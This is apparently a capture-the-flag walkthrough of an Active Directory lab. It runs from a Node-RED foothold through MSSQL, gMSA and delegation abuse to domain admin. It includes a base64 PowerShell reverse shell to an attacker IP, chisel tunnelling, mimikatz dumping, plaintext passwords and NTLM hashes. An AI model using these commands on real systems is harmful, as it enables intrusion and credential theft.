# Enumeration 

Found Node-red on one of the 3 machines and created a node to get reverse shell and got ssh access.

Now enumerating Node-red found creds for MSSQLwhich contains some credential files
![](attachment/c4a51a37705a54f21338e19f05229dd1.png)
We can find this in the files:
![](attachment/e2c5b11517d15f6f4794804a12e5dd1f.png)
Now we need to decrypt this password:
https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/
Running it now:
`./cred_decode.sh .`
./cred_decode.sh .![](attachment/c1d7e0be453a17c01eda1d58af37b487.png)

Now checking access to mssql from this machine:
![](attachment/c91ae8570647662457eb37639870534e.png)
Now we can port forward with chisel
Target:
`./chisel client 10.8.1.208:8001 R:socks`
Attacker:
`chisel server --reverse --socks5 -p 8001`
![](attachment/263b129692d8605755f7bf40ebeb30e1.png)

Now using proxychains with mssqlclient:
```
proxychains mssqlclient.py nodered_connector:'DreamPuppyOverall25'@10.10.135.166
```

Now enumerating database DemoS![](attachment/555c08f38133e1c35389580563db1731.png)
And using crackstation we get the password

Now checking linux for the realm we can switch to domain user and get flag:
![](attachment/3c2a31cd3d856a13c29fe25ac7443103.png)

Now using KeyTabExtract on `/etc/krb5.keytab` 
![](attachment/c40769ceedd8680c725b558c0c2e1b8c.png)

Using bloodhound:
![](attachment/9aaea8cceabd1c13310fee1065ee0637.png)
We can get gmsa password with 
```
proxychains nxc ldap tengu.vl -u NODERED$ -H d4210ee2db0c03aa3611c9ef8a4dbf49 --gmsa
```

![](attachment/b408f33878738ad4c8e0a21dc450fcf6.png)

Now we can use this to impersonate users in the `SQL)ADMINS` group
![](attachment/7062fb32b57608fdbe3f2323d0d56f3e.png)

There's 2 users in the group:
![](attachment/ed68317408816290e60142038c3edaed.png)

Trying `T1_C.FOWLER`
```
proxychains -q getST.py -spn 'MSSQLSvc/SQL.tengu.vl:1433' -dc-ip dc.tengu.vl -impersonate 'T1_C.FOWLER' -hashes :bd1811a45423dcdd470df09ed1621b97 'tengu.vl/gmsa01'
```
![](attachment/9dcd64d5eb2bd0d5a2fbe67ff6b07602.png)
Not allowed

Now trying `t1_m.winters` we get a ticket.

To login to mssql:
```
proxychains -q mssqlclient.py SQL.tengu.vl -k -no-pass
```

Now we can get reverse shell with:
```
xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADEALgAyADAAOAAiACwAOQAwADAANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

![](attachment/c8474e494f2fac03a63b92d2674d76f9.png)
Now we can use Godpotato as we have SeImpersonate permission:
![](attachment/4bf5c8264d5faa5f12e2b73101a07ecf.png)

Now using mimikatz:
```
Invoke-Mimikatz -Command '"lsadump::sam"'
```
![](attachment/e679dec5a7cbf909acfb9482b57ac369.png)

Now using [[SharpDPAPI]] we can get credentials ![](attachment/208127b5d7f6ebaaa50c5845ef58171e.png)

Using these credentials with netexec we get `STATUS_ACCOUNT_RESTRICTION`

We can use kerkeros authentication:
```
proxychains kinit T0_c.fowler
```

Then use 
```
proxychains -q evil-winrm -i dc.tengu.vl -r TENGU.VL
```